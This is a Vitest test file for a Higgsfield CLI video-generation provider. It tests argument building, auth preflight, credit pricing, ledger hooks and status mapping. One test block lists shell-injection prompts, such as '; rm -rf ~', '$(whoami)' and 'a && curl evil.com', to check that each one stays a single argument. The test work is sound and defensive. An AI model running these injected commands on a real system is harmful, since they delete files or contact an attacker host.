// tests/video/providers/higgsfield-cli.test.ts
// T5 — HiggsfieldCliProvider (src/video/providers/higgsfield-cli.ts).
//
// Every test injects a fake CliRunner. NOTHING here may spawn the real
// `higgsfield` binary — that would hit a live, logged-in account (see the
// header comment in higgsfield-cli.ts on why the CLI provider is single-tenant
// and opt-in only).
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { EventEmitter } from 'node:events';

// Mocks the real spawn boundary so the ENOENT ("not on PATH") test below
// never launches a process — it exercises defaultRunner's own translation
// logic (higgsfield-cli.ts) through a fake EventEmitter child, not a real
// `higgsfield` binary.
vi.mock('node:child_process', () => ({
  spawn: vi.fn(),
}));
import { spawn } from 'node:child_process';

import {
  HiggsfieldCliProvider,
  buildCliArgs,
  creditsToUsd,
  type CliResult,
  type CliRunner,
} from '../../../src/video/providers/higgsfield-cli.js';
import {
  validateHiggsfieldPricingAtBoot,
  _resetValidatedPricingForTests,
} from '../../../src/core/higgsfield-pricing.js';
import { PROVIDERS } from '../../../src/core/models.js';
import { ValidationError } from '../../../src/core/errors.js';
import type { VideoGenerationRequest, VideoLedgerHooks } from '../../../src/video/providers/base.js';

/** A modelId that actually exists in VIDEO_MODELS — buildCliArgs only checks presence. */
const KNOWN_MODEL_ID = 'higgsfield-soul-standard';

function baseReq(overrides: Partial<VideoGenerationRequest> = {}): VideoGenerationRequest {
  return {
    modelId: KNOWN_MODEL_ID,
    mode: 't2v',
    prompt: 'a quiet lake at sunrise',
    durationSec: 8,
    resolution: '720p',
    ...overrides,
  };
}

function ok(stdout: string): CliResult {
  return { stdout, stderr: '', exitCode: 0 };
}

function fail(exitCode: number, stderr = 'boom'): CliResult {
  return { stdout: '', stderr, exitCode };
}

/** Builds a runner from a queue of results/throws, one per call, in order. */
function queueRunner(steps: Array<CliResult | Error>): CliRunner {
  let i = 0;
  return vi.fn(async () => {
    const step = steps[i++];
    if (step === undefined) {
      throw new Error(`queueRunner: no step queued for call #${i}`);
    }
    if (step instanceof Error) throw step;
    return step;
  });
}

describe('buildCliArgs — shell injection is structurally impossible', () => {
  // The array boundary IS the security property (see higgsfield-cli.ts header:
  // "shell: false is the security property"). If a malicious prompt ever gets
  // split across multiple argv elements or concatenated into one, that
  // property is gone even though nothing "looks" wrong in a diff.
  const dangerousPrompts = [
    '; rm -rf ~',
    'a `whoami` b',
    '$(whoami)',
    'line one\nline two && curl evil.com',
    'quote " inside',
    'a && curl evil.com',
  ];

  it.each(dangerousPrompts)('prompt %j survives as exactly one verbatim array element', (prompt) => {
    const args = buildCliArgs(baseReq({ prompt }));

    // Exactly one element equals the prompt verbatim — not split, not escaped,
    // not partially matched by a substring check that would also pass for a
    // mangled/escaped copy.
    const matches = args.filter((a) => a === prompt);
    expect(matches).toHaveLength(1);

    // No element other than the prompt itself may contain a shell
    // metacharacter that came from the prompt. If it did, some later code
    // path that joins argv into a string (there should be none, but this
    // guards the invariant) would let the metacharacter execute.
    for (const el of args) {
      if (el === prompt) continue;
      expect(el.includes(';')).toBe(false);
      expect(el.includes('`')).toBe(false);
      expect(el.includes('$(')).toBe(false);
      expect(el.includes('&&')).toBe(false);
      expect(el.includes('\n')).toBe(false);
    }
  });

  it('returns a flat string array (never a joined command string)', () => {
    const args = buildCliArgs(baseReq({ prompt: '; rm -rf ~' }));
    expect(Array.isArray(args)).toBe(true);
    for (const el of args) {
      expect(typeof el).toBe('string');
    }
    // A joined string would be a single element containing '--prompt'
    // followed by the dangerous prompt in the SAME element — assert instead
    // that '--prompt' and the prompt are two separate elements.
    const promptFlagIdx = args.indexOf('--prompt');
    expect(promptFlagIdx).toBeGreaterThanOrEqual(0);
    expect(args[promptFlagIdx + 1]).toBe('; rm -rf ~');
    expect(args[promptFlagIdx]).not.toContain('; rm -rf ~');
  });
});

describe('buildCliArgs — flag mapping', () => {
  it('puts modelId first and always includes --prompt', () => {
    const args = buildCliArgs(baseReq());
    expect(args[0]).toBe(KNOWN_MODEL_ID);
    expect(args).toContain('--prompt');
  });

  it('omits --duration/--aspect-ratio when not meaningfully set', () => {
    const args = buildCliArgs(baseReq({ durationSec: 0, resolution: '720p', aspectRatio: undefined }));
    expect(args).not.toContain('--duration');
    // resolution is a required (non-optional) field on VideoGenerationRequest,
    // so an "absent resolution" branch is unreachable and deliberately not
    // asserted here — only the falsy-duration / absent-aspect-ratio branches are.
    expect(args).not.toContain('--aspect-ratio');
  });

  it('includes --duration/--resolution/--aspect-ratio when set', () => {
    const args = buildCliArgs(baseReq({ durationSec: 5, resolution: '1080p', aspectRatio: '16:9' }));
    expect(args).toEqual(
      expect.arrayContaining(['--duration', '5', '--resolution', '1080p', '--aspect-ratio', '16:9']),
    );
  });

  it('maps firstFrameImagePath to --start-image and lastFrameImagePath to --end-image', () => {
    const args = buildCliArgs(
      baseReq({ firstFrameImagePath: '/tmp/first.png', lastFrameImagePath: '/tmp/last.png' }),
    );
    const startIdx = args.indexOf('--start-image');
    const endIdx = args.indexOf('--end-image');
    expect(startIdx).toBeGreaterThanOrEqual(0);
    expect(endIdx).toBeGreaterThanOrEqual(0);
    expect(args[startIdx + 1]).toBe('/tmp/first.png');
    expect(args[endIdx + 1]).toBe('/tmp/last.png');
  });

  it('omits --start-image/--end-image when absent', () => {
    const args = buildCliArgs(baseReq());
    expect(args).not.toContain('--start-image');
    expect(args).not.toContain('--end-image');
  });

  it('emits zero --image-references flags for zero references', () => {
    const args = buildCliArgs(baseReq({ referenceImagePaths: [] }));
    expect(args.filter((a) => a === '--image-references')).toHaveLength(0);
  });

  it('emits one --image-references flag for one reference', () => {
    const args = buildCliArgs(baseReq({ referenceImagePaths: ['/tmp/ref1.png'] }));
    const flags = args.filter((a) => a === '--image-references');
    expect(flags).toHaveLength(1);
    const idx = args.indexOf('--image-references');
    expect(args[idx + 1]).toBe('/tmp/ref1.png');
  });

  it('emits one --image-references flag PER reference for three references', () => {
    const refs = ['/tmp/a.png', '/tmp/b.png', '/tmp/c.png'];
    const args = buildCliArgs(baseReq({ referenceImagePaths: refs }));
    const flags = args.filter((a) => a === '--image-references');
    expect(flags).toHaveLength(3);
    // Each ref must appear immediately after its own flag occurrence, not just
    // "somewhere in the array" — proves repeatable-flag pairing, not accidental
    // presence.
    const positions = args.reduce<number[]>((acc, a, i) => {
      if (a === '--image-references') acc.push(i);
      return acc;
    }, []);
    expect(positions.map((i) => args[i + 1])).toEqual(refs);
  });

  it('throws ValidationError for an unknown modelId', () => {
    expect(() => buildCliArgs(baseReq({ modelId: 'totally-not-a-real-model' }))).toThrow(ValidationError);
  });
});

describe('HiggsfieldCliProvider.preflight()', () => {
  let provider: HiggsfieldCliProvider;

  it('passes on exit 0 with non-empty stdout', async () => {
    const runner = queueRunner([ok('{"token":"abc"}')]);
    provider = new HiggsfieldCliProvider({ runner });
    await expect(provider.preflight()).resolves.toBeUndefined();
  });

  it('throws mentioning `higgsfield auth login` on non-zero exit', async () => {
    const runner = queueRunner([fail(1, 'no session')]);
    provider = new HiggsfieldCliProvider({ runner });
    await expect(provider.preflight()).rejects.toThrow(/higgsfield auth login/);
  });

  it('throws on empty stdout even with exit 0', async () => {
    const runner = queueRunner([ok('')]);
    provider = new HiggsfieldCliProvider({ runner });
    await expect(provider.preflight()).rejects.toThrow(/higgsfield auth login/);
  });

  it('surfaces the "not on PATH" message for an ENOENT-shaped spawn error (no injected runner — exercises defaultRunner itself)', async () => {
    // preflight() just re-throws whatever the runner rejects with (see the
    // "ENOENT is already translated..." comment in higgsfield-cli.ts) — the
    // translation from a raw ENOENT to the actionable message is defaultRunner's
    // job. So this test uses the REAL default runner but with node:child_process
    // mocked, rather than an injected fake runner, or it would only prove that
    // whatever message we hand it comes back out.
    const fakeChild = new EventEmitter() as unknown as {
      stdout: EventEmitter;
      stderr: EventEmitter;
      kill: () => void;
    } & EventEmitter;
    fakeChild.stdout = new EventEmitter();
    fakeChild.stderr = new EventEmitter();
    fakeChild.kill = vi.fn();
    vi.mocked(spawn).mockReturnValue(fakeChild as never);

    provider = new HiggsfieldCliProvider();
    const promise = provider.preflight();
    // defaultRunner registers its 'error' listener synchronously inside the
    // Promise executor, which has already run by this point.
    const enoent = Object.assign(new Error('spawn higgsfield ENOENT'), { code: 'ENOENT' });
    fakeChild.emit('error', enoent);

    await expect(promise).rejects.toThrow(/not on PATH/);
  });
});

describe('HiggsfieldCliProvider.fetchCostCredits()', () => {
  it('parses {"credits": 2}', async () => {
    const runner = queueRunner([ok('{"credits": 2}')]);
    const provider = new HiggsfieldCliProvider({ runner });
    await expect(provider.fetchCostCredits(baseReq())).resolves.toBe(2);
  });

  it('throws on non-zero exit', async () => {
    const runner = queueRunner([fail(2, 'rate limited')]);
    const provider = new HiggsfieldCliProvider({ runner });
    await expect(provider.fetchCostCredits(baseReq())).rejects.toThrow(/generate cost failed/);
  });

  it('throws when the credits field is missing', async () => {
    const runner = queueRunner([ok('{}')]);
    const provider = new HiggsfieldCliProvider({ runner });
    await expect(provider.fetchCostCredits(baseReq())).rejects.toThrow(/no usable "credits" field/);
  });

  it('throws when credits is non-numeric', async () => {
    const runner = queueRunner([ok('{"credits": "two"}')]);
    const provider = new HiggsfieldCliProvider({ runner });
    await expect(provider.fetchCostCredits(baseReq())).rejects.toThrow(/no usable "credits" field/);
  });

  it('throws with the raw stdout included when it is unparseable', async () => {
    const runner = queueRunner([ok('not json at all')]);
    const provider = new HiggsfieldCliProvider({ runner });
    await expect(provider.fetchCostCredits(baseReq())).rejects.toThrow(/not json at all/);
  });
});

describe('HiggsfieldCliProvider.estimateCostUSD() — must never fabricate a price', () => {
  let prevRate: string | undefined;

  beforeEach(() => {
    prevRate = process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'];
    process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'] = '0.039';
    validateHiggsfieldPricingAtBoot();
  });

  afterEach(() => {
    if (prevRate === undefined) delete process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'];
    else process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'] = prevRate;
    _resetValidatedPricingForTests();
  });

  it('throws before any fetchCostCredits call — the discriminating test', () => {
    // A fabricated estimate here (0, or a guess) would sail through the cost
    // guard and land in the ledger as if it were a real Higgsfield-quoted
    // price. It must throw instead.
    const runner: CliRunner = vi.fn();
    const provider = new HiggsfieldCliProvider({ runner });
    expect(() => provider.estimateCostUSD(baseReq())).toThrow(/no cost estimate cached/);
    expect(runner).not.toHaveBeenCalled();
  });

  it('returns credits * USD_PER_CREDIT after fetchCostCredits has cached an answer', async () => {
    const runner = queueRunner([ok('{"credits": 25}')]);
    const provider = new HiggsfieldCliProvider({ runner });
    const req = baseReq();
    await provider.fetchCostCredits(req);
    expect(provider.estimateCostUSD(req)).toBeCloseTo(25 * 0.039, 10);
  });
});

describe('creditsToUsd()', () => {
  let prevRate: string | undefined;

  beforeEach(() => {
    prevRate = process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'];
  });

  afterEach(() => {
    if (prevRate === undefined) delete process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'];
    else process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'] = prevRate;
    _resetValidatedPricingForTests();
  });

  it('multiplies credits by the validated USD_PER_CREDIT rate', () => {
    process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'] = '0.039';
    validateHiggsfieldPricingAtBoot();
    expect(creditsToUsd(70)).toBeCloseTo(70 * 0.039, 10);
  });
});

describe('HiggsfieldCliProvider ledger hooks (A5 contract)', () => {
  let prevRate: string | undefined;

  beforeEach(() => {
    prevRate = process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'];
    process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'] = '0.039';
    validateHiggsfieldPricingAtBoot();
  });

  afterEach(() => {
    if (prevRate === undefined) delete process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'];
    else process.env['MEDIA_FORGE_HIGGSFIELD_USD_PER_CREDIT'] = prevRate;
    _resetValidatedPricingForTests();
  });

  function makeHooks(order: string[]) {
    const beforeSubmit = vi.fn(async () => {
      order.push('reserve');
    });
    const onSubmitFailed = vi.fn(async () => {
      order.push('release');
    });
    const onPostSubmitError = vi.fn(() => {
      order.push('postSubmitError');
    });
    const hooks: VideoLedgerHooks = { beforeSubmit, onSubmitFailed, onPostSubmitError };
    return { hooks, beforeSubmit, onSubmitFailed, onPostSubmitError };
  }

  it('on success: beforeSubmit runs BEFORE the create runner call, and onSubmitFailed is never called', async () => {
    const order: string[] = [];
    // preflight (auth token) -> fetchCostCredits (generate cost) -> generate create
    const runner = vi.fn(async (args: ReadonlyArray<string>) => {
      if (args[0] === 'auth') return ok('{"token":"abc"}');
      if (args[1] === 'cost') return ok('{"credits": 10}');
      if (args[1] === 'create') {
        order.push('submit');
        return ok('{"id": "job-123"}');
      }
      throw new Error(`unexpected args: ${args.join(' ')}`);
    });
    const provider = new HiggsfieldCliProvider({ runner });
    const { hooks, beforeSubmit, onSubmitFailed } = makeHooks(order);

    const handle = await provider.generate(baseReq(), hooks);

    expect(handle.providerNativeId).toBe('job-123');
    expect(beforeSubmit).toHaveBeenCalledTimes(1);
    expect(order).toEqual(['reserve', 'submit']);
    expect(onSubmitFailed).not.toHaveBeenCalled();
  });

  it('when the create runner rejects, onSubmitFailed IS called and the error propagates', async () => {
    const rejectErr = new Error('network blew up');
    const runner = vi.fn(async (args: ReadonlyArray<string>) => {
      if (args[0] === 'auth') return ok('{"token":"abc"}');
      if (args[1] === 'cost') return ok('{"credits": 10}');
      if (args[1] === 'create') throw rejectErr;
      throw new Error(`unexpected args: ${args.join(' ')}`);
    });
    const provider = new HiggsfieldCliProvider({ runner });
    const { hooks, onSubmitFailed, onPostSubmitError } = makeHooks([]);

    await expect(provider.generate(baseReq(), hooks)).rejects.toThrow(/network blew up/);
    expect(onSubmitFailed).toHaveBeenCalledTimes(1);
    expect(onPostSubmitError).not.toHaveBeenCalled();
  });

  it('when create exits non-zero, onSubmitFailed IS called and the error propagates', async () => {
    const runner = vi.fn(async (args: ReadonlyArray<string>) => {
      if (args[0] === 'auth') return ok('{"token":"abc"}');
      if (args[1] === 'cost') return ok('{"credits": 10}');
      if (args[1] === 'create') return fail(3, 'quota exceeded');
      throw new Error(`unexpected args: ${args.join(' ')}`);
    });
    const provider = new HiggsfieldCliProvider({ runner });
    const { hooks, onSubmitFailed, onPostSubmitError } = makeHooks([]);

    await expect(provider.generate(baseReq(), hooks)).rejects.toThrow(/generate create failed/);
    expect(onSubmitFailed).toHaveBeenCalledTimes(1);
    expect(onPostSubmitError).not.toHaveBeenCalled();
  });

  it('when create exits 0 but returns no job id, onPostSubmitError is called and onSubmitFailed is NOT — this asymmetry is the point', async () => {
    // The CLI accepted the job (exit 0) so it is very likely already billing.
    // Releasing the reservation here (as onSubmitFailed would) would let a
    // running generation complete for free — the expensive mistake this test
    // guards against.
    const runner = vi.fn(async (args: ReadonlyArray<string>) => {
      if (args[0] === 'auth') return ok('{"token":"abc"}');
      if (args[1] === 'cost') return ok('{"credits": 10}');
      if (args[1] === 'create') return ok('{"no_id_here": true}');
      throw new Error(`unexpected args: ${args.join(' ')}`);
    });
    const provider = new HiggsfieldCliProvider({ runner });
    const { hooks, onSubmitFailed, onPostSubmitError } = makeHooks([]);

    await expect(provider.generate(baseReq(), hooks)).rejects.toThrow(/returned no job id/);
    expect(onPostSubmitError).toHaveBeenCalledTimes(1);
    expect(onSubmitFailed).not.toHaveBeenCalled();
  });

  it('beforeSubmit throwing blocks the submit — the create runner must never be invoked', async () => {
    const runner = vi.fn(async (args: ReadonlyArray<string>) => {
      if (args[0] === 'auth') return ok('{"token":"abc"}');
      if (args[1] === 'cost') return ok('{"credits": 10}');
      if (args[1] === 'create') {
        throw new Error('CREATE MUST NOT HAVE BEEN CALLED');
      }
      throw new Error(`unexpected args: ${args.join(' ')}`);
    });
    const provider = new HiggsfieldCliProvider({ runner });
    const beforeSubmit = vi.fn(async () => {
      throw new Error('InsufficientCreditError: balance too low');
    });
    const onSubmitFailed = vi.fn();
    const onPostSubmitError = vi.fn();

    await expect(
      provider.generate(baseReq(), { beforeSubmit, onSubmitFailed, onPostSubmitError }),
    ).rejects.toThrow(/InsufficientCreditError/);

    const createCalls = runner.mock.calls.filter(([args]) => (args as string[])[1] === 'create');
    expect(createCalls).toHaveLength(0);
    expect(onSubmitFailed).not.toHaveBeenCalled();
    expect(onPostSubmitError).not.toHaveBeenCalled();
  });

  it('when fetchCostCredits fails before beforeSubmit ever runs, NEITHER hook fires — nothing was reserved to release', async () => {
    // generate() calls preflight() then fetchCostCredits() BEFORE beforeSubmit
    // (see higgsfield-cli.ts:305-310). If the cost fetch itself fails, no
    // reservation was ever opened, so calling onSubmitFailed here would be a
    // release with no matching reserve — a different bug than the ones this
    // file otherwise checks for.
    const runner = vi.fn(async (args: ReadonlyArray<string>) => {
      if (args[0] === 'auth') return ok('{"token":"abc"}');
      if (args[1] === 'cost') return fail(5, 'pricing service down');
      throw new Error(`unexpected args: ${args.join(' ')} — create must never be reached`);
    });
    const provider = new HiggsfieldCliProvider({ runner });
    const { hooks, beforeSubmit, onSubmitFailed, onPostSubmitError } = makeHooks([]);

    await expect(provider.generate(baseReq(), hooks)).rejects.toThrow(/generate cost failed/);

    expect(beforeSubmit).not.toHaveBeenCalled();
    expect(onSubmitFailed).not.toHaveBeenCalled();
    expect(onPostSubmitError).not.toHaveBeenCalled();
  });

  it('create exits 0 but stdout is unparseable garbage — also takes the post-submit path, not onSubmitFailed', async () => {
    // The try block wrapping parseJson (higgsfield-cli.ts:339-355) covers BOTH
    // the missing-id case and a parse failure. Exit 0 means the CLI accepted
    // the job either way, so an unparseable success body must be treated the
    // same as a missing id: onPostSubmitError, never a release.
    const runner = vi.fn(async (args: ReadonlyArray<string>) => {
      if (args[0] === 'auth') return ok('{"token":"abc"}');
      if (args[1] === 'cost') return ok('{"credits": 10}');
      if (args[1] === 'create') return ok('not json at all');
      throw new Error(`unexpected args: ${args.join(' ')}`);
    });
    const provider = new HiggsfieldCliProvider({ runner });
    const { hooks, onSubmitFailed, onPostSubmitError } = makeHooks([]);

    await expect(provider.generate(baseReq(), hooks)).rejects.toThrow(/could not parse/);
    expect(onPostSubmitError).toHaveBeenCalledTimes(1);
    expect(onSubmitFailed).not.toHaveBeenCalled();
  });
});

describe('HiggsfieldCliProvider.pollStatus() mapping', () => {
  async function pollWith(status: string | undefined): Promise<string> {
    const runner = queueRunner([ok(JSON.stringify({ status }))]);
    const provider = new HiggsfieldCliProvider({ runner });
    const result = await provider.pollStatus('job-1');
    return result.state;
  }

  it.each([
    ['completed', 'completed'],
    ['succeeded', 'completed'],
    ['failed', 'failed'],
    ['canceled', 'canceled'],
    ['cancelled', 'canceled'],
    ['nsfw', 'nsfw'],
    ['content_moderated', 'nsfw'],
    ['queued', 'pending'],
    ['pending', 'pending'],
  ])('maps CLI status %s -> %s', async (cliStatus, expected) => {
    expect(await pollWith(cliStatus)).toBe(expected);
  });

  it('maps an UNKNOWN status to in_progress, not failed — abandoning a running/billing job is the expensive mistake', async () => {
    expect(await pollWith('some_brand_new_status_this_build_has_never_seen')).toBe('in_progress');
  });

  it('non-zero exit returns state failed with an errorMessage, rather than throwing', async () => {
    const runner = queueRunner([fail(7, 'internal error')]);
    const provider = new HiggsfieldCliProvider({ runner });
    const result = await provider.pollStatus('job-1');
    expect(result.state).toBe('failed');
    expect(result.errorMessage).toMatch(/generate get failed/);
  });
});

describe('PROVIDERS registry', () => {
  it('contains higgsfield-cli as a distinct, separately-indexed entry from higgsfield', () => {
    expect(PROVIDERS).toContain('higgsfield-cli');
    expect(PROVIDERS).toContain('higgsfield');
    expect(PROVIDERS.filter((p) => p === 'higgsfield-cli')).toHaveLength(1);
    // Two distinct slots in the array, not the same entry read twice — ties
    // the registry check to the actual array shape rather than to two string
    // literals that would trivially differ regardless of what PROVIDERS holds.
    expect(PROVIDERS.indexOf('higgsfield-cli')).not.toBe(PROVIDERS.indexOf('higgsfield'));
  });

  it('the adapter itself reports the higgsfield-cli name (ties PROVIDERS to the real adapter, not just the array literal)', () => {
    const provider = new HiggsfieldCliProvider({ runner: vi.fn() });
    expect(provider.name).toBe('higgsfield-cli');
    expect(PROVIDERS).toContain(provider.name);
  });
});
